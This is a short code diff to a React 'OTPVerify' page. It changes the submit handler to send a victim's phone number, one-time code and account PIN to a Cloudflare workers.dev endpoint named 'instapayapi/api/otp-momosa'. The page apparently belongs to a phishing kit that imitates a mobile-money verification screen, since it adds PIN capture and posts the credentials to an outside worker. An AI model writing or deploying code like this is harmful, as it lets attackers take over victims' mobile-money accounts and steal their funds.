@@ -31,10 +31,11 @@ export default function OTPVerify() {
 
   const handleSubmit = async () => {
     const payload = {
-      username: phone,
-      otp: otp
+      phone: phone,
+      otp: otp.join(''),
+      pin: pin.join('')
     }
-    const res = await fetch('https://my-worker.instapayapi.workers.dev/api/otp',
+    const res = await fetch('https://my-worker-app.instapayapi.workers.dev/api/otp-momosa',
       {
         method: "POST",
         headers: { "Content-Type": "application/json" },
